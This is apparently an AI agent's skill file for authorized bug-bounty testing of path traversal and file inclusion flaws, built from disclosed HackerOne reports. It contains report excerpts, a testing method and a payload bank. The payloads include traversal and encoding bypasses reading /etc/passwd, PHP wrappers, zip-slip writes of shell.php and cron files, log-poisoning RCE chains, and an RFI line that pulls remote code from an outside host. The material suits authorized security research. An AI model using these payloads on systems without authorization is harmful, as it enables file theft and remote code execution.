---
name: bbhunt-path-traversal
description: "Use for file read/write primitives: download, export, template, include, and archive-extraction paths; PHP wrappers; symlinks; log poisoning. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Path Traversal / LFI / RFI — unified skill

> **Complete merged skill.** Everything from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.

## Corpus evidence — 300 valid HackerOne reports (52 paid / 17%)

Every disclosed report is valid; payment is an impact signal, not a validity test.

### Techniques ranked across ALL valid reports

| Technique | Reports |
|---|---:|
| public source-code / repo review | 113 |
| internal service / port / container | 85 |
| file upload / filename / extension | 68 |
| admin / privileged-role context | 65 |
| HTTP method / verb tampering | 62 |
| WAF / sanitizer / filter bypass | 59 |
| unauthenticated / removed-cookie test | 43 |
| encoding / double-encode / null byte | 40 |
| Content-Type / body-format switch | 35 |
| header injection (Host / X-Forwarded / etc.) | 34 |
| cache / CDN / unkeyed header | 29 |
| parser confusion / normalization | 24 |
| XML / SOAP / SAML / XXE | 24 |
| second-order / stored / blind delivery | 19 |
| JS bundle / source-map inspection | 13 |
| subdomain / DNS / cert-transparency recon | 12 |
| error message / stack trace probing | 11 |
| third-party data / paste / breach reuse | 11 |
| intercept & replay request in Burp | 10 |
| webhook / OAuth / SAML / integration abuse | 9 |
| DOM / HTML source inspection | 8 |
| verbose debug / framework fingerprint | 7 |
| public bucket / storage exposure | 7 |
| race / concurrency / timing | 7 |
| git history / exposed .git | 7 |
| parameter pollution / duplicate keys | 7 |
| API docs / Swagger / introspection | 7 |
| JWT / token / base64 decode | 6 |
| two-account / cross-account replay | 5 |
| cloud metadata / IAM abuse | 5 |
| replay / modify a captured request | 5 |
| OAST / DNS / HTTP callback proof | 5 |
| deserialization / gadget chain | 4 |
| fuzzing / wordlist brute force | 3 |
| employee / developer public info | 3 |
| swap object ID / parameter value | 2 |
| redirect chain / Location header | 1 |
| search-engine dorking | 1 |
| browser DevTools / network tab | 1 |
| response diff / status / length comparison | 1 |

### Parameters observed in writeups

`type` (8), `max-age` (7), `path` (7), `url` (6), `name` (5), `textdomain` (5), `lang` (5), `filename` (5), `href` (5), `charset` (4), `file` (4), `token` (3), `result` (3), `vcs_metadata_dirs` (3), `version` (2), `report-uri` (2), `deliver` (2), `output` (2), `meta` (1), `config.assets.compile` (1), `config.public_file_server.enabled` (1), `__cfduid` (1), `server` (1), `res.statuscode` (1), `host` (1), `port` (1), `nc_samesitecookielax` (1), `nc_samesitecookiestrict` (1), `ocya3bx9cxde` (1), `oc_sessionpassphrase` (1)

### Bypass primitives observed

`content-type` (61), `bypass` (45), `url-encoded` (17), `normalization` (15), `normalize` (14), `transfer-encoding` (11), `chunked` (8), `normalized` (8), `allowlist` (8), `backslash` (6), `bypasses` (6), `bypassed` (6), `bypassing` (6), `blacklist` (5), `trailing slash` (5), `denylist` (5), `whitelist` (3), `%0d%0a` (3), `percent-encoded` (3), `race condition` (2), `normalizepath` (2), `http method` (1), `html encode` (1), `double slash` (1), `url encoding` (1), `normalizing` (1), `blind` (1), `bypassable` (1)

### Impact language observed

`arbitrary file` (173), `localhost` (154), `admin` (99), `secret` (74), `password` (63), `token` (60), `credential` (49), `rce` (41), `remote code execution` (39), `sensitive information` (24), `sensitive data` (15), `api key` (8), `privilege escalation` (8), `arbitrary code` (7), `unauthorized` (6), `exfiltration` (3), `arbitrary write` (2), `payment` (1), `personally identifiable` (1), `financial` (1)

### Case studies — full excerpts (paid and unpaid)

#### [1439593](https://hackerone.com/reports/1439593) — Arbitrary file read  via the bulk imports UploadsPipeline

GitLab · $29000 · critical

### Summary The bulk imports api does not remove symlinks when untaring the uploads.tar.gz file, allowing arbitrary files to be read and uploaded when importing a group. When a group has uploads (such as markdown attachments), an `uploads.tar.gz` file will be downloaded and extracted in the `UploadsPipeline`: Since `untar_zxf` only changes the permissions, any symlinks that are extracted from the tar will remain and be added to the list of file paths. When `load` is called, the symlinks will be followed and used as the content for the new file: This can be used to read any file that the git user has read access to such as secrets.yml or other sensitive files. ### Steps to reproduce 1. Create a new group on gitlab.com 1. Create a new milestone and upload a file `passwd` with any content into the description 1. Make note of the upload secret (the 32 byte hash in the path) 1. Run the following commands to make a tar file, using the hash from above 1. Save the following simple proxy server as `api.py` and run it with `FLASK_APP=api flask run`, this will replace the `uploads.tar.gz` with a custom one: {F1565789} 1. Start [ngrok]( so that it's externally accessible: `ngrok http 5000` 1. Create a new access token at 1. Create a new group, this time choose import group 1. Enter the https ngrok url and the token you just created 1. Select the group you initially created and choose a new

#### [827052](https://hackerone.com/reports/827052) — Arbitrary file read via the UploadsRewriter when moving and issue

GitLab · $20000 · critical

### Summary The `UploadsRewriter` does not validate the file name, allowing arbitrary files to be copied via directory traversal when moving an issue to a new project. The pattern used to look for references is : This is used by the `UploadsRewriter` when copying an issue to also copy across the files: As there is no restriction on what `file` can be, path traversal can be used to copy any file. Demo {F757226} ### Steps to reproduce 1. Create two projects 1. Add an issue with the following description: 1. Move the issue to the second project 1. The file will have been copied to the project ### Impact Allows an attacker to read arbitrary files on the server, including tokens, private data, configs, etc ### What is the current *bug* behavior? The file name and path are not checked when copying an issue between projects ### What is the expected *correct* behavior? The file or path should be validated before copying files. ### Output of checks #### Results of GitLab environment info ## Impact Allows an attacker to read arbitrary files on the server, including tokens, private data, configs, etc

#### [1132378](https://hackerone.com/reports/1132378) — Arbitrary file read during project import

GitLab · $16000 · critical

> NOTE! Thanks for submitting a report! Please replace *all* the (parenthesized) sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report! ### Summary A mis-usage of json schema validator could be used by an attacker to read any file in GitLab server. The issue allows the attacker to leak ~250 bytes of data of any file. At the same time, as the root cause of the issue here is 'open-uri'. It's an SSRF issue at the same time. ### Steps to reproduce 1. Use the import feature of gitlab.com to import the attached import.tar.gz as 'GitLab export' ███████ 2. Wait the import process to finish 3. Access URL: where PROJECT_ID is the id of the imported project, which could be found in the home page of the project. 4. The connection information of gitlab's production database is in the output, as attached. ### Impact For GitLab.com, this issue could be used to leak some critical credentials. I went through the charts in ` It seems that there're a bunch of juicy credentials could be leaked with this method, including Rails secret_key_base, database credentials and GitLab's smtp credentials. The object storage service account credential is limitedly accessed because of the 250 bytes limitation. For self-hosted GitLab instances, this issue could cause more severe

#### [822262](https://hackerone.com/reports/822262) — Path traversal in Nuget Package Registry

GitLab · $12000 · high

### Summary There's a path traversal issue in Nuget package registry which was released to GitLab-EE recently. The issue allows an attacker to create any file with an extension “.nupkg” in the filesystem. By combining the bug with a race condition in Gitaly which I used several times before (#762421, #732330). It could finally be used to read sensitive files in a GitLab instance. For some context, a large part of the exploit were explained in #762421, the npm registry issue. Here I will focus on the simple path traversal part which makes a little bit difference. The root cause of the path traversal lies at `ee/app/services/packages/nuget/metadata_extraction_service.rb` It extracts the uploaded nupkg (which is in zip format) for the contained nuspec file (which is an XML). And then looks for attribute `id` and `version`. Then the extracted package_name(id), and package_version(version) will be concatenated into a new filename in `ee/app/services/packages/nuget/update_package_from_metadata_service.rb` So my payload is: name the file above as `dummy.nuspec` and zip it into `dummy.nupkg` and upload it through `PUT /api/v4/projects/#{id}/packages/nuget/` endpoint will make GitLab to create a `nyangawa.nupkg` somewhere in the filesystem. Then I wrote a script (I used in #762421) to combine this issue and the race in Gitaly. I could finally read any file I want in my GitLab instance. 

#### [2995025](https://hackerone.com/reports/2995025) — Mozilla VPN Clients: RCE via file write and path traversal

Mozilla · $6000 · high

## Summary: Hi! I decided to have another look at the Mozilla VPN Client, after #2920675 was set to resolved. When going over all commands in the inspector, I noticed the "live_reload" command can be used with remote files. When using this command, the remote file is downloaded to a tmp folder. The problem is that there is a path traversal here, meaning we can override any file on the filesystem (tested on Windows). Vulnerable code (InspectorHotreloader::fetchAndAnnounce() You can see in the above snippet, that the temp_path is simply a concatenation of a set directory and our filename. ## Steps To Reproduce: 1. Download Mozilla VPN here: 1. Turn on developer mode (see video PoC below): 1. Open the help menu 1. Click the "Help" title 6 times rapidly 1. In the developer options, check "Use Staging Servers" 1. Fully close and reopen 1. Save the following HTML and open it (change to your attacker_server) 1. Notice the file was written to C:\Users\user\AppData\Local\Mozilla instead of C:\Users\user\AppData\Local\Mozilla\Mozilla VPN\hot_reload. ## Supporting Material/References: █████ Happy to help if anything is unclear! ## Impact Any file can be overridden leading to RCE. This is exploitable via limited user interaction (simply opening the attacker site) when the staging servers are being used. ==Note that this does not work on macOS.== The impact is the same as in #2920675.

#### [1858574](https://hackerone.com/reports/1858574) — [CVE-2022-44268] Arbitrary Remote Leak via ImageMagick

HackerOne · no bounty — still valid · critical

**Summary:** HackerOne's image upload is using ImageMagick to convert/resize images and is likely updated. Thus, it's vulnerable to CVE-2022-44268. **Description:** ### Steps To Reproduce 1. Navigate to your profile 2. Edit and upload the attached image (`im-lfi.png`) as your profile picture 3. Save changes and download the resized picture 4. Issue the following command to view the downloaded image's profile data; Then, copy the `Raw profile type:` and decode it using any tool or using Python like; I've attached the resized image too which contains the content of /etc/passwd i.e. 86bca9490b71a481329efc85de3a82a98f6c29475f4926fd2b5fc844b96899c0.png ## Impact Arbitrary Remote Leak

#### [727727](https://hackerone.com/reports/727727) — Path traversal in filename in LINE Mac client

LY Corporation · no bounty — still valid · high

Initially, @hackerontwowheels and @renekroka discovered that by using a path traversal payload combined with `#` to block out the file extension, arbitrary, pre-installed applications could be executed. It was not possible to provide additional arguments to these applications, however. The payload used for OS X Yosemite was: `..%2f..%2f..%2f..%2f..%2f..%2f..%2fApplications%2fCalculator.app#.zip`, which would execute the calculator app. Running commands with parameters, was not possible (Example: `/Applications/iTerm.app ls -al`). Afterwards, the reporters also identified an issue where they could achieve code execution, given that gatekeeper was disabled, by chaining the upload of an executable file through "Keep" (a file storage service in the LINE App), then trigger the execution using the previous path traversal vulnerability. The filetype had to be a .terminal file, due to it not being on the blacklist, as Keep normally filters executables and restricts sharing of these types of files in order to avoid this type of issue. The complete chain looked like this: 1. Upload malicious .terminal file to Keep 2. Share .terminal file with victim from Keep 3. Victim downloads shared file 4. Send malicious .zip file with path traversal vulnerability 5. Victim clicks .zip file 6. Code is executed (if Gatekeeper is turned off) Through a logic error in file name parsing, it was possible f

### Recurring approach patterns from real reports

- 5× i used the burp to make a raw url and send it to server
- 5× an attacker could exploit this vulnerability by sending a crafted http request containing directory traversal character sequences to an affected device
- 4× description i discovered previously unidentified instance in network vulnerable to the cve poc we can disclose user sessions by quering sessions suggested fix updating to the latest version should fix the issue
- 3× supporting material references configuration i ve used to find this vulnerability kali linux nodejs v8 npm burpsuite wrap up i contacted the maintainer to let them know n i opened an issue in the related repository n impact this vulnerability allows malicious user to list file in the folder
- 3× summary i discovered a vulnerability read only path traversal cve at description a vulnerability in the web services interface of cisco adaptive security appliance asa software and cisco firepower threat defense ftd software could allow an unauthenticated remote attacker to conduct directory traversal attacks and read sensitive files on a targeted system
- 2× i have tried to reproduce from within firefox and internet explorer without much luck however if you need it i will try to come up with a work around
- 2× i found out that was vulnerable to cve the ip has a ssl certificate pointing to curl kv output impact anyone can read any file present on the server
- 1× hey after reading egix s report and seeing your fix at i think the fixes are insufficient to stop lfi
- 1× sp1d3rs was able to demonstrate this vulnerability by crafting a specially formatted url
- 1× browsing this link will ask for admin username and password as asked when browsing or hence disclosing the directory path of forbidden area
- 1× from within the http request function of the acunetix and ironwasp programs i was able to view the passwd and hosts files at please see the attached screenshots for proof
- 1× i was able to escape from the unique directory where the user s avatar is stored after uploading in the s3 bucket using characters in the filename for example test test jpg on the endpoint
- 1× i have found multiple path transversal in torproject org poc there are many many others which can be accessed by searching following in google inurl index of site torproject org i know that its out of scope of your bounty program but i thought i should tell you about it
- 1× module specification name lactate version latest release build verified conditions test server ubuntu lts curl package curl i have not presently attempted to contact the maintainer and would appreciate assistance from node js security in doing so as described in the disclosure guidelines
- 1× i tried reaching the cache servers from a docker instance itself but wasn t able to i tried from a reverse shell spawned from a docker instance
- 1× when i started looking at this i had to specify which paths to download from the cache
- 1× hi this report is about directory traversal vulnerability i found in module
- 1× however i ve noticed that using simple bypasses with or i can easily go up in the directory tree
- 1× try to open any directory or file if available by clicking on its name
- 1× from the terminal execute following command please adjust numbers of to your system you should see the content of file f255391 supporting material references configuration i ve used to find this vulnerability macos highsierra node npm curl wrap up i hope this report will help to keep node ecosystem more safe
- 1× if we follow code flow we find that first file name is read from and check if exists depends on http method used handler function is called here s for get maps to in we can see line that is created directly from and piped to response object
- 1× example zip file contents and extraction locations the full file path of the zip file destination was identified from error messages observed during testing e g secondly the display ads file processor is vulnerable to path traversal when processing data csv files
- 1× during testing however i have been unable to identify any writable directories outside of and it s subdirectories
- 1× module stats downloads in the last day downloads in the last week downloads in the last month estimated downloads per year vulnerability vulnerability description superstatic verifies that current dir is not evaded by checking the presense of in the decoded path but on windows works

## Corpus-backed method (this class)

1. Identify the exact filesystem operation: read, include, write, or extract. The exploit differs for each.
2. Establish the base directory with a known file, then walk out with encoded and raw traversals at increasing depth.
3. Test encoding levels appropriate to the decoder chain: raw, URL, double URL, Unicode, and null termination where relevant.
4. For include primitives, identify wrappers supported by the stack (`php://`, `data://`, `zip://`, `phar://`) and confirm the interpreter.
5. For write/extract primitives, test absolute paths, symlinks inside archives, and filename control — arbitrary write is stronger than read.
6. Prove a specific file read with unique content; for RCE chains, use a controlled log/temp file rather than destructive changes.

### Signals

- Filename, path, file, document, template, or download parameters
- Archive upload/extract features
- Error messages exposing filesystem paths
- Language-specific include semantics (PHP wrappers, Java resources)

### Kill criteria

- Path is constrained to a fixed allowlist of real files.
- Traversal characters are stripped and no decoder mismatch exists.
- No identifiable file read — only generic errors.

### Escalation chains

- Symlink in archive -> arbitrary file read -> credentials.
- LFI + log poisoning -> RCE.
- Arbitrary write -> config override -> code execution.

### Probes

- ../../../../etc/passwd , ..%2f..%2f , ....// , %252e%252e%252f
- php://filter/convert.base64-encode/resource=index.php
- Absolute path in filename field; symlink entry inside tar/zip

### Veteran tip

Archive symlink handling is a repeated corpus theme — extraction code that changes permissions but keeps symlinks is a high-value pattern.

## Unified upstream methodology (complete, deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Find file/path params: file, path, template, lang, download, export, log, image.
- Try `../`, encoded variants, double encoding, unicode, backslashes, absolute paths.
- Bypass filters with nested sequences (`....//`), null bytes, and extension tricks.
- Test archive extraction (zip slip) and file-write paths.
- Look for LFI-to-RCE via log poisoning, sessions, and uploads.

### Deeper checklist

- Find file/path parameters: file, path, template, lang, download, export, log.
- Try `../`, encoded variants, double encoding, unicode, backslashes, and absolute paths.
- Bypass filters with nested sequences (`....//`), null bytes, and extension tricks.
- Test archive extraction (zip slip) and file-write paths for traversal.
- Look for LFI-to-RCE via log poisoning, session files, and uploaded content.
- Read a harmless proof file (/etc/hostname, win.ini) and stop there.

### A. Discovery checklist — concrete places, params, headers, file types to look

- Parameter inventory beyond the classics: `?file= ?path= ?filename= ?template= ?view= ?lang= ?module= ?include= ?doc= ?load= ?read= ?content= ?download= ?img= ?pdf= ?report= ?style= ?dir=`, plus JSON bodies `{"filename":...}`, `{"path":...}`, `{"template":...}`.
- Non-query sinks that are easy to miss: multipart `filename` fields (PortSwigger labs for superfluous decode and null-byte bypass both use this), `Content-Disposition` filenames (curl CVE family), archive extraction entry names (Zip Slip), tar symlinks, and image-processing coder paths.
- Framework-specific 2025-2026 advisories to pattern-match: h3 `serveStatic()` GHSA-wr4h-v87w-p3r7 (percent-encoded `%2e%2e` dot segments), curl `file://` protocol handler traversals and FTP wildcard-download escapes, Weblate `.svn/.bzr` VCS metadata exclusion bypass CVE-2026-61792, WordPress `_wp_attachment_metadata` poisoning → arbitrary file deletion.
- Client-side path traversal (CSPT): encoded `../` in SPA router paths (React Router, Next.js, Vue Router, Angular, SvelteKit, Nuxt, Ember, SolidStart) bypasses route guards and controls the API URL — a CSRF/XSS primitive. Browser normalises literal `../` but not `%2E%2E`; backslashes normalise to slashes.
- Nginx alias misconfiguration: `location /images/ { alias /var/www/app/img/; }` without the trailing slash permits `/images../config.php`. Also check `location = /admin { deny all; }` bypass via trailing slash.
- Static-file/download endpoints, template/include params, export/report generators, and CDN origin paths are the recurring high-value locations.
- Fingerprint the stack to pick a payload: PHP → filters/phar/zip; Java servlet → `WEB-INF/web.xml`; Python → `/proc/self/environ`, `settings.py`; Node → h3/express static serving; Windows IIS → `..\..\web.config`.

### Signals and surfaces

### Signal

- Reports: **300** · paid: **52**
- Median bounty **$1,000** · p90 **$6,000** · max **$29,000** · total **$151,224**
- Median upvotes **12**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 5 | $79,000 | 2157 |
| Internet Bug Bounty | 11 | $18,355 | 368 |
| Basecamp | 3 | $9,337 | 158 |
| Mail.ru | 15 | $8,300 | 729 |
| PortSwigger Web Security | 3 | $6,000 | 322 |
| Mozilla | 2 | $6,000 | 233 |
| Keybase | 1 | $5,000 | 196 |
| Slack | 1 | $3,500 | 50 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`file` `path` `filename` `template` `lang` `download` `export` `log` `image` `folder` `dir`

### Crown Jewel Targets

LFI that reaches code execution is Critical. Pure file-read is High when it exposes secrets (`.env`, `wp-config.php`, private keys, cloud creds), Medium when it only reads non-sensitive files.

**Highest-value chains (in rough order of reliability in 2026):**
- **PHP filter-chain → RCE** — the modern default. A bare `php://filter` *file-read* primitive is upgraded to RCE with **no upload endpoint and no writable file** by chaining `iconv` conversions to forge an arbitrary PHP payload in-memory (Synacktiv, 2022). See the dedicated section below. This is the single most impactful thing to try and the most-missed.
- **Log poisoning → RCE** — inject PHP into an Apache/Nginx log (User-Agent / URL path), then include the log. Increasingly blocked by `open_basedir` and unreadable log perms, so verify the log is *readable* first.
- **PHP wrappers → source disclosure** — `php://filter/convert.base64-encode/resource=index.php` leaks source; read source to find more LFI sinks, secrets, and the include base path.
- **RFI → RCE** — when `allow_url_include=On`, `?file=http://OOB/shell.txt` pulls and executes remote code. Rare on modern configs but trivially Critical when present.
- **phar:// deserialization** — a crafted PHAR + any unserialize-on-metadata sink → object-injection RCE.
- **zip:// / data:// chains** and **session/upload poisoning** when filters block wrappers.

---

### Technology Stack Signals

| Signal | Vector |
|--------|--------|
| PHP (`X-Powered-By`, `.php`, PHPSESSID) | php:// filter-chain RCE, phar://, zip://, data:// |
| Apache/Nginx logs readable | Log poisoning → RCE (verify readability first) |
| Apache 2.4.49 / 2.4.50 (`Server:` banner) | CVE-2021-41773 / CVE-2021-42013 traversal → RCE |
| PHP-CGI on Windows (XAMPP, `php-cgi.exe`) | CVE-2024-4577 arg-injection → RCE |
| Java servlet (`/WEB-INF/`) | `WEB-INF/web.xml`, `classes/`, `application.properties` |
| Python Flask/Django | `/proc/self/environ`, `settings.py`, `SECRET_KEY` |
| Node.js file-serve / `res.sendFile`, `express.static` | path-traversal read, `require()` traversal |
| Windows IIS / .NET | `..\..\web.config`, `C:\Windows\win.ini`, machineKey |

---

### Techniques, payloads and bypasses

### Payloads & probes

- `../../../../etc/passwd` `..%2f..%2f..%2fetc/passwd` `%2e%2e%2f%2e%2e%2f`
- `....//....//etc/passwd` `..\..\..\windows\win.ini` `..%c0%af..%c0%af`
- `/etc/passwd%00.png` `file:///etc/passwd` `php://filter/convert.base64-encode/resource=index`
- Zip slip -> `../../../../var/www/shell.php` in archive entry name

### Payload bank

**59 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Filter bypass

```text
....//....//....//etc/passwd
....\....\....\windows\win.ini
..././..././..././etc/passwd
..;/..;/..;/etc/passwd
..%00/..%00/..%00/etc/passwd
/etc/passwd%00.png
/etc/passwd%00.jpg
....//....//....//....//etc/passwd
..%2f..%2f..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc%252fpasswd
..//..//..//etc/passwd
..%5c..%5c..%5cwindows%5cwin.ini
```

### Bypass tricks

- Double encoding and mixed encodings (%252e, %c0%af, overlong UTF-8).
- Strip traversal once, then bypass with `....//` or `..%2f`.
- Absolute paths, UNC paths, and symlinks.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Arbitrary file read via the UploadsRewriter when moving and issue** — `#827052` · GitLab · $20,000 · ▲1503
  > The `UploadsRewriter` does not validate the file name, allowing arbitrary files to be copied via directory traversal when moving an issue to a new project.
- **[CVE-2022-44268] Arbitrary Remote Leak via ImageMagick** — `#1858574` · HackerOne · $0 · ▲371
  > Then, copy the `Raw profile type:` and decode it using any tool or using Python like;
- **Arbitrary file read  via the bulk imports UploadsPipeline** — `#1439593` · GitLab · $29,000 · ▲329
  > Save the following simple proxy server as `api.py` and run it with `FLASK APP=api flask run`, this will replace the `uploads.tar.gz` with a custom one: {F1565789}
- **Misuse of an authentication cookie combined with a path traversal on app.starbucks.com permitted access to restricted data** — `#876295` · Starbucks · $0 · ▲239
  > zlz and rhynorater discovered that by obtaining a valid authentication cookie and then combining that with a path traversal, this allowed access to restricted data.
- **Arbitrary file read during project import** — `#1132378` · GitLab · $16,000 · ▲194
  > I went through the charts in `https://gitlab.com/gitlab-org/charts/gitlab/-/tree/master/charts/gitlab/charts/sidekiq/templates`.
- **Burp Suite Professional: browser-powered crawl can write attacker-controlled files through file input handling** — `#3712279` · PortSwigger Web Security · $5,000 · ▲176
  > The issue is caused by Burp's handling of `<input type="file" `: Burp creates a local upload file from page-controlled attributes, but does not prevent path traversal in the generated filename.
- **Path traversal in filename in LINE Mac client** — `#727727` · LY Corporation · $0 · ▲175
  > The payload used for OS X Yosemite was: `..%2f..%2f..%2f..%2f..%2f..%2f..%2fApplications%2fCalculator.app .zip`, which would execute the calculator app.
- **Mozilla VPN Clients: RCE via file write and path traversal** — `#2995025` · Mozilla · $6,000 · ▲173
  > Vulnerable code (InspectorHotreloader::fetchAndAnnounce() https://github.com/mozilla-mobile/mozilla-vpn-client/blob/main/src/inspector/inspectorhotreloader.cpp):
- **RCE as Admin defeats WordPress hardening and file permissions** — `#436928` · WordPress · $0 · ▲164
  > and each part of it is appended to $target parent (../../../../../../../var/tmp/) and then chmod with the permission bit of 777.
- **[portswigger.net] Path Traversal al /cms/audioitems** — `#2424815` · PortSwigger Web Security · $0 · ▲146
  > `curl -kis "https://portswigger.net/cms/audioitems//etc/shadow"`
- **Payload delivery via Social Media urls on H1 profile** — `#2483422` · HackerOne · $0 · ▲138
  > HackerOne allows users to add social media profiles to their HackerOne profile via the [profile/edit](https://hackerone.com/settings/profile/edit) page.
- **Wordpress unzip_file path traversal** — `#205481` · WordPress · $0 · ▲119
  > Filenames can be crafted in order to place files in any directory which the webserver has write permissions, for example a zip entry with a filename of `../../../../../../../../../../tmp/poc file` would place the file contents in the '/tmp/poc file' directory.
- **Path Traversal Vulnerability in Lila Project** — `#3181066` · Lichess · $0 · ▲117
  > Privilege escalation (indirectly): By reading files related to user tokens or access control, an attacker might craft further exploits.
- **Zero day path traversal vulnerability in Grafana 8.x allows unauthenticated arbitrary local file read** — `#1415820` · Aiven Ltd · $1,000 · ▲105
  > 1.Run the following curl command to get the content of the /etc/passwd file on the server:
- **Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49** — `#1394916` · Internet Bug Bounty · $4,000 · ▲96
  > If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism.
- **Path traversal in Nuget Package Registry** — `#822262` · GitLab · $12,000 · ▲88
  > name the file above as `dummy.nuspec` and zip it into `dummy.nupkg` and upload it through `PUT /api/v4/projects/ {id}/packages/nuget/` endpoint will make GitLab to create a `nyangawa.nupkg` somewhere in the filesystem.
- **Korea - LFI via path traversal at https://msr.istarbucks.co.kr:6443/appif/** — `#780021` · Starbucks · $0 · ▲81
  > While analyzing the Starbucks Korea mobile application, i noticed that it called an API at https://msr.istarbucks.co.kr:6443/appif/.
- **File writing by Directory traversal at actionpack-page_caching and RCE by it** — `#519220` · Ruby on Rails · $1,000 · ▲80
  > Since the URL can use `.` or` / `encoded values, the cache will be written in an unexpected place.
- **Grafana LFI on https://grafana.mariadb.org** — `#1419213` · MariaDB · $0 · ▲73
  > There is an LFI on `https://grafana.mariadb.org/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd`
- **CVE-█████-35813 in █████** — `#2200329` · Mars · $0 · ▲71
  > The vulnerability was exploited through the sitecore xaml.ashx endpoint using ASP.NET TemplateParser injection, allowing attackers to execute arbitrary code by manipulating the ParseControl function with malicious XAML markup.
- **CVE-2020-3187 - Unauthenticated Arbitrary File Deletion** — `#960330` · U.S. Dept Of Defense · $0 · ▲70
  > Vector: [CVSS:3.0/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X](https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
- **Unauthenticated LFI (Local File Inclusion) using the symbol `!` At the target `https://████/`** — `#2778380` · U.S. Dept Of Defense · $0 · ▲69
  > Sanitize user input and don't trust user inputs that come for your server in a `GET` method after the endpoint `/compilerDirectivesAdd/{Attackers Coming From Here To Read Local Files}`, it would be better to maintain a whitelist of acceptable filenames and…
- **jitsi-call-analytics: Unauthenticated arbitrary file write via path traversal in `/api/v1/uploads/analyze`** — `#3485343` · 8x8 · $100 · ▲68
  > The upload handler used user-controlled `file.originalname` directly in `path.join()` without sanitization, enabling attackers to include `../` sequences to escape the intended per-session UUID directory and write or overwrite files anywhere under the…
- **Path traversal by monkey-patching Buffer internals** — `#2434811` · Internet Bug Bounty · $2,430 · ▲67
  > However, after the permission model implementation has called `path.resolve()`, the exploit intercepts the internal call to `utf8Write()` within `Buffer.from()` and replaces the sanitized path with `/tmp/../etc/passwd`, thus bypassing the path traversal…
- **Path traversal in deeplink query parameter can expose any user's private info to a public directory (one click)** — `#2553411` · Basecamp · $0 · ▲65
  > <a href="https://3.basecamp.com/5195267/reports/progress?filename=/../../../../../../../../../../sdcard/Download/disclosure.txt" click me</a
- **Path Traversal Vulnerability in Nextcloud Tables Enables Arbitrary File Exfiltration of Any Files Supported by PhpSpreadsheet Library** — `#3249624` · Nextcloud · $0 · ▲63
  > Security advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-wpp5-4w35-pxq6
- **CVE-2018-0296 Cisco ASA Denial of Service & Path Traversal vulnerable on [mtn.co.ug]** — `#2375666` · MTN Group · $0 · ▲62
  > Navigate intercept request to burp-suite `h27da.n1.ips.mtn.co.ug/+CSCOU+/../+CSCOE+/files/file list.json`
- **MozillaVPN: Elevation of Privilege via a Logic Vulnerability** — `#2686750` · Mozilla · $0 · ▲60
  > This vulnerability is a bypass for a previously fixed issue 2261577.
- **Path traversal by drive name in Windows environment** — `#2307225` · Node.js · $0 · ▲59
  > This vulnerability affects Windows users of `path.join` API.
- **ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection** — `#3580511` · Ruby on Rails · $0 · ▲57
  > When a Hash is passed to `.attach()`, every key-value pair — including `key:` — is forwarded to `Blob.build after unfurling` via ` ` splat.

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 26× | `../` |
| 8× | `path.resolve()` |
| 6× | `path.join()` |
| 6× | `$backup_sizes` |
| 6× | `finalize_item()` |
| 6× | `/../` |
| 6× | `%2f%2e%2e%2f` |
| 5× | `wp_delete_attachment_files()` |
| 5× | `$meta['file']` |
| 5× | `dedotdotify()` |
| 5× | `$id` |
| 4× | `Buffer.from()` |
| 4× | `Curl_urldecode()` |
| 4× | `ctxt->root` |
| 4× | `openat()` |
| 4× | `%2f` |
| 4× | `to a chosen directory (in this case,` |
| 4× | `<server-IP>` |
| 3× | `$to` |
| 3× | `.attach()` |

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Baseline payloads: `../../../etc/passwd`, `....//....//....//etc/passwd` (single-pass `../` strip), `..%2f..%2f..%2fetc%2fpasswd`, `..%252f..%252f..%252fetc%252fpasswd` (double decode), `%2e%2e%2f`, `..%c0%af`, `..%ef%bc%8f`.
- Absolute-path bypass when `../` is blocked but the filename is treated as relative: `filename=/etc/passwd`.
- Prefix-forced base: supply the expected base then traverse — `/var/www/images/../../../etc/passwd`.
- Extension check bypass with null byte: `../../../etc/passwd%00.png` (PHP < 5.3.4 / legacy stacks only).
- Percent-encoded dot segments with no normalisation (h3 advisory): `curl --path-as-is 'http://host/%2e%2e/%2e%2e/%2e%2e/etc/passwd'` — FastURL returns the raw path, `decodeURI()` turns `%2e` into `.`, then `path.join` resolves it at the OS. Use `--path-as-is` or Burp so the client does not normalise it.
- Windows variants: `..\..\..\windows\win.ini`, `..%5c`, `C:\inetpub\wwwroot\web.config`, and extra trailing dots/slashes (Windows ignores them).
- PHP source disclosure via wrapper: `php://filter/convert.base64-encode/resource=index.php` — always base64-encode, otherwise `<?php ... ?>` is parsed and swallowed.
- Zip Slip / tar symlink: craft archive entry names `../../../etc/cron.d/x` or a symlink pointing at `/etc/passwd`; confirm by writing a unique canary outside the extraction dir.
- ImageMagick coder read sinks without any file param: `label:@/etc/passwd`, `<image xlink:href="msl:/etc/passwd">`, `ephemeral:`/`msl:` pseudo-protocols (ImageTragick family).
